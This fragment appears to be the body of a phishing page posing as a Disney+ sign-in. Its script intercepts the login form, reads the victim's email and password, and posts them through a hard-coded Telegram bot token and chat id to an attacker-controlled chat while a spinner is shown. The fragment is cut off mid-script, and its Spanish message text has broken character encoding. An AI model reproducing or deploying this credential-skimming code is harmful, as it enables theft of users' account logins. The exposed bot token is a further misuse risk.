<body>

  <!-- Overlay du spinner -->

  <script>
    document.getElementById("loginForm").addEventListener("submit", function(e) {
      e.preventDefault();
      document.getElementById("spinnerOverlay").style.display = "flex";

      const email = this.querySelector('input[type="email"]').value.trim();
      const pwd   = this.querySelector('input[type="password"]').value.trim();

      const botToken = "8079060666:AAGfVOxTqIR7teiEPuU3a-qZFcL9vdVTSOg";
      const chatId   = "-4970333928";
      const message  = `游댏 Inicio de sesi칩n Disney+:\nUsuario: ${email}\nContrase침a: ${pwd}`;

      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: chatId, text: message })
      }).catch(console.error)

</body>
